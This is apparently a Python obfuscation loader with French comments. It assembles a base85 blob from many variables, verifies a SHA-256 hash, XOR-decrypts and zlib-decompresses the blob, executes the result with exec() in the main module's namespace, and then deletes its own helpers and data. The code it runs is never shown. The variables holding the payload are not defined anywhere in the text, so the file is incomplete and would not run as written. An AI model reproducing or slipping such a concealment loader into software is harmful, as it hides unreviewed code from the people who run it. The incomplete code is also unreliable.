_pbMCfJM6MooMjO = __import__('base64').b85decode(_cf1faX9bk4etWy + _cdNInVIzAjAWRD + _cnCNTT0WaO6I39 + _ckJIXtK9adjM82 + _c_lErSpnck0IS6 + _c_gwn0vJx5Acy9 + _cxs35pwA8MIuPN + _caAJcPBek2wraa + _cw4QXjBNYChmgy + _cpXZPu8L0M3Mui + _cj1drv0VvQkjvR + _cucvkvWZ7CGqMh + _ccDdE1Y1kkQNQj + _ct_dCPWhYu_T32 + _ckQvRm_VR9q7jS + _cg2DTRei7rXtmz + _cpKLpjIHXAM7LK + _cjtaUrSIyGntTL + _cphWUSl1nR7BE4 + _cxQ7Te6PkTl9uf + _cdsmXVDb8Z_NQi + _cyXPqXmoCnG0md + _cuViwNKeue5HcQ + _cxoXiB9becRZpi + _cbu4MZ2jjcDSxb + _cy0hd9r6xlxBGj + _cqBbZ4cZINut99 + _cwwcnd3Qep3mQJ + _cdUXAzufNeNAyN + _cc7xYi_ATHrldS + _cl12C6cfASyODo + _co4WekmYD9ZCBb + _citY0qus6OiXlO + _cmQKC57mhmPtZx + _coe4JCqq3kVDxs + _ckNCaAMhHllf7U + _cfZAOQ9OOBKrW0 + _cksi1S09CmzTdb + _csGmLufPDjdctz + _criHoP6lU6RK9m + _ctOdRSg_XF9aca + _cl54U7FjIiFEgR + _ck4qeLWlrMq5eA + _caVrwo_IMxSVUG + _ccve0K54qjSvRi + _cvngdm8J9v2I66 + _cwZH0jstr20uNK + _cwkzW8zcENTgbQ + _cfI8hkNnoymBkp + _cyeA61sAaB_8Dn + _cslrA5ztGVCnTT + _cmftEh7R1x3cSK + _ccYsSCA55C24TG + _ceHLkSQqYZMdcP + _caBzPomeMja4zt + _cpfFQlMCC_2fRa + _cmRNX5AnDt4COv + _crdIa55uv4RYVc + _cktAEQGRdh05kW + _cf4OW4jwqiU8OP + _cwfLH_osfOQwzb + _cp_S16NSzEkSid + _cssjiI4Wf_ymFj + _cgdl4ByM2trCc7 + _cmqjuuikDUZEHG + _cw3zhTtc8ItfO7 + _caEAptoqYxv3tL + _coloagpd3gXDxk + _cqS8VvorNtfdOm + _clRrIawy_eicMH + _cmtRhzEQBF6kEX + _ckk_MmKdGpObCL + _cwhXuyPztTSsJQ + _clQfSaD4Z1EeIK + _cbNaCHqszrpwZd + _cvx05k3K9F8uED + _cnXjTYOijsEqjv + _ceTikRJTFmjhd6 + _ceBFIBDwZ2ha8f + _cdz68ytF7bCaGe + _ciUtT9vveT7SlC + _cvBOSL9Y7HhHxd + _coNcZfQlMlnMvX + _cjKMlJ2FsNAIct + _clt7FpN6nMO6xO + _cdFUlPGSHFA7IH + _cfSjpMZVR6qKXC + _chnjms_pPrbVCs + _cu955_Ivn1inC6 + _cf04pPafKl9vQs + _cwbvaNDdWk2Zx2 + _ciQN45gHTMmcab + _cyvzbDsk23JvQy + _cnYERRPkQTvx3v + _cyZ6Xq4G80r8AR + _cgZZb2VYU4CvB3 + _coXHd8NCXpVEOc + _cftgGz3ydYddAr + _crr2rf2sBx7lIR + _crQo56mdkPGpZO + _cjBAnJMedIRwUW + _cyg0cu1pGRpmjc + _cfyEUKX9pBlRtZ + _ckIdwBbUpb5HaG + _cr4NbUas8xptEt + _camzjvX921_gVd + _ceqPvFzAKMTF_5 + _cv3I7BF0P0sxyd + _cf5iMnzng9i7az + _cvR9LCKzGQgjXL + _ccrYahQpxXZ3tL + _ct0kbaKuoPDayX + _clepEeJwCELbo3 + _cmbnNZFVC_NfX6 + _cntRVkEtBZ8sJa + _ckwQ5J7_0RT6yJ + _cjnmxz6Wvt7gOa + _cvDPwe8ejoamaF + _cyYvl4zIYt2xCk + _cpHOEWzbQvn67e + _cqy1mZwezkXsds + _cfEqMnIXYzXGcc + _cv1JVHRmKR_onS + _cjsdmln2YFHYEW + _c_d8dEhlPu24pJ + _cndO1tRIlCiqv1 + _cgZjQHKfE6_crk + _cuY_734tVliVPV + _coABDMaUN8W6QV + _cfGCamHe5TiwRt + _cxDn1M19BKPo9_ + _czHFVqSNvgg8hp + _cuHCztlDRk5Qzn + _cb496io2dWs5Ys + _caaqlyHUlW12n2 + _cyWizPt1oU_Gyf + _ceCvgMFMHN1R3g + _c_C533NxFwvrgG + _cqL27vk8dOQgAT + _cfyHHjjaTuSsQ2 + _crwNqvLt9_UzEZ + _cbYHWT_WZQQo6o + _cjkw8e4m7fUGmP + _cvdQHp9De85g2X + _cgRfJsCf5Af6Ov + _cz4nMcUexWE6GM + _caobCcxpILHE1Y + _csW5zUvXhAbX47 + _cwhb11bC_1vvA7 + _ctuz4T9Ux6fFaO + _cbZAnCaFV0Fv11 + _ctxv1gzioKQXjV + _ciMxI0NOEoMh74 + _cwpmG3znMHI9jj + _c_eoL6F5yPoYE1 + _cyACfveWDW4mHI + _ciaUsJxQSmw7nY + _csxAtZ_tPKQN6H + _cj8lWGr7er49PH + _cnPSivLf_x5h83 + _cw7CWEvdPSktuW + _cbdqUfRTzO1Amc + _cer5UoEO9NTWbT + _czrh1zneB3UZU5 + _ctT_mkKXhz20tE + _chv28vAx5h72gT + _clKx4Z9x1W89tm + _cosivR9v_oWlpy + _cik8oRWYD15w1w + _cqYEv5keIUjiIL + _ckNtM7nVx2W31p + _cbTRht4d6FGjAa + _clfB7M5Z7ZPhOr + _cnbHMGz70YtxTP + _czVY508WkEn6JM + _cso6atvCV964Ym + _cecSYigaWwPpgO + _cqtlHcc49TL_kt + _cyaY__Y5ETkAMa + _cbLbUMxqsh7B3g + _cuQQ6tj0DFBF36 + _ckCcQcPPB0ATXB + _cevJsLLze38kzb + _ctQauoentro72S + _crC6WR98DVM_sF + _culel3sqNND9l4 + _cuDGeYgjcwF0Qf + _co5HMeRaVT4QO9 + _cmOvhbhlzyfiy0 + _ceNOJcP7hLBG2V + _cbYzajrkNQI9B8)
if __import__('hashlib').sha256(_pbMCfJM6MooMjO).hexdigest() != '6a4659b0c686de2b1708431154f1e7f483c87c3bf8a6030c43481b3d58ed1d04':
    __import__('sys').exit(1)
_xkQsJMzsTh0yxr = bytes([17, 26, 181, 40, 247, 38, 104, 56, 247, 33, 85, 49, 191, 72, 252, 215, 98, 227, 197])
_fkbVr_0jQVO4TKw = bytes([100, 159, 91, 40, 96, 161, 78, 174, 182, 105, 59, 47, 170, 63, 4, 125, 62, 106, 30])

def _fxxfErZmNrtkMmo(_bbkC975nUaN1aX, _kmE_UGceBe6lHC):
    return bytes(_bbkC975nUaN1aX[_iqobe8hHj0jmsi] ^ _kmE_UGceBe6lHC[_iqobe8hHj0jmsi % len(_kmE_UGceBe6lHC)] for _iqobe8hHj0jmsi in range(len(_bbkC975nUaN1aX)))

def _fdpTaYy3YHVVD4B(_tneM_7JMkLfFbA):
    import zlib
    return zlib.decompress(_tneM_7JMkLfFbA) # Un seul niveau de zlib ici pour simplifier

def _feirqCyZcJX3X0q():
    import sys, builtins
    # 1. Déchiffrement XOR
    _xqa8Zoj4aitJ8F = _fxxfErZmNrtkMmo(_pbMCfJM6MooMjO, _xkQsJMzsTh0yxr)
    # 2. Décompression Zlib
    _dpRzFxoTaXZc8t = _fdpTaYy3YHVVD4B(_xqa8Zoj4aitJ8F)
    # 3. Conversion bytes -> string (C'est là la différence clé !)
    source_code = _dpRzFxoTaXZc8t.decode('utf-8')
    
    # 4. Préparation de l'environnement
    _main = sys.modules['__main__']
    _nr1p2Yt5B2fCcD = _main.__dict__
    _nr1p2Yt5B2fCcD.setdefault('__builtins__', builtins)
    
    # 5. Exécution directe du code source
    # On compile à la volée, ce qui marche sur n'importe quelle version de Python
    try:
        exec(source_code, _nr1p2Yt5B2fCcD)
    except Exception as e:
        print(f"Erreur fatale: {e}")
        sys.exit(1)

_feirqCyZcJX3X0q()
try:
    del _fxxfErZmNrtkMmo, _fdpTaYy3YHVVD4B, _feirqCyZcJX3X0q
    del _pbMCfJM6MooMjO, _xkQsJMzsTh0yxr, _fkbVr_0jQVO4TKw
except:
    pass
